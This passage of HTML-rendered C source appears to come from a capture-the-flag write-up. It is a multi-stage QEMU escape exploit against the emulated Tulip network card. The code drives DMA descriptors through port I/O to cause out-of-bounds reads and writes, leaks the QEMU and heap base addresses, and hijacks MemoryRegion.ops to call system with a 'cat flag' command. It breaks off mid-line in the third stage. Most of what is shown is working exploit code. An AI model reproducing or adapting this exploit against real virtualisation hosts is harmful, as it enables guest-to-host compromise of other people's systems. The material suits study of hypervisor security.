class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) <span class="comment">// 4096</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0x000000000000c000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR(_x) ((_x) &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR5_TS_SUSPENDED 6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line">tulip_write -&gt;</span><br><span class="line">tulip_xmit_list_update -&gt; </span><br><span class="line">tulip_copy_tx_buffers -&gt;         </span><br><span class="line">pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;tx_frame + s-&gt;tx_frame_len, len1); -&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">tulip_ts</span><span class="params">(TULIPState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (s-&gt;csr[<span class="number">5</span>] &gt;&gt; CSR5_TS_SHIFT) &amp; CSR5_TS_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> status;</span><br><span class="line">    <span class="keyword">uint32_t</span> control;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint64_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> val;</span><br><span class="line">    val = inw(PMIO_BASE + port);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outw(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate descriptor</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">tx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">rx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *recv_buf = <span class="built_in">malloc</span>(<span class="number">0x9000</span>);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(recv_buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x9000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// TDES1_FS, clean tx_frame_len</span></span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the physical address of the descriptor</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set CSR5_TS_SUSPENDED</span></span><br><span class="line">    pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len should be 0x400 now</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);   </span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len shoule be 0x800 now</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> &#123;</span>                   <span class="comment">// control the following fields in TULIPState</span></span><br><span class="line">        <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">        <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">    len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">    oob_data-&gt;tx_frame_len = <span class="number">0x400</span> - len1;</span><br><span class="line">    oob_data-&gt;rx_frame_len = <span class="number">0x900</span>;</span><br><span class="line">    oob_data-&gt;rx_frame_size = <span class="number">2048</span>*<span class="number">2</span> + <span class="number">0x900</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff</span></span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line">    pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">1</span>));         <span class="comment">// CSR6_OM_SHIFT trigger tulip_receive</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] OOB write tx_frame_len...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rx_len1, rx_len2;</span><br><span class="line">    rx_len1 = <span class="number">0x400</span>;</span><br><span class="line">    rx_len2 = <span class="number">0</span>;</span><br><span class="line">    rx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// RDES0_OWN</span></span><br><span class="line">    rx_desc-&gt;buf_addr1  = gva_to_gpa(recv_buf);</span><br><span class="line">    rx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    rx_desc-&gt;control    = rx_len2 | rx_len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set rx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> rx_desc_gpa = gva_to_gpa(rx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] rx_desc_gpa: 0x%lx\n&quot;</span>, rx_desc_gpa);</span><br><span class="line">    pmio_writel(CSR(<span class="number">3</span>), rx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx 0x%016lx\n&quot;</span>, *(<span class="keyword">size_t</span> *)cur, *(<span class="keyword">size_t</span> *)(cur+<span class="number">8</span>));</span><br><span class="line">        cur += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">0x1d</span>] - <span class="number">0x755f9f</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">22</span>] - <span class="number">0xe11380</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_plt_system = qemu_base+<span class="number">2859620</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> frame_base = heap_base+<span class="number">0xe0fcf0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] continue...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_base: 0x%lx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] heap_base: 0x%lx\n&quot;</span>, heap_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage2\n&quot;</span>); &#123;</span><br><span class="line"></span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x3350</span> - <span class="number">0x70</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">1</span>)); <span class="comment">// trigger tulip_tx</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *binsh = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        binsh[<span class="number">0</span>] = <span class="number">7449354444534473059</span>; <span class="comment">// catflag</span></span><br><span class="line">        binsh[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">16</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(binsh);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// now control MemoryRegion.ops</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage3\n&quot;</span>); &#123;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">0</span>] = qemu_plt_system;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">1</span>] = qemu_plt_system;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">8</span>] = <span class="number">0x0000000400000004</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">        </span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x2a28</span><span class="number">-0x70</span>;  <span class="comment">// now points to the 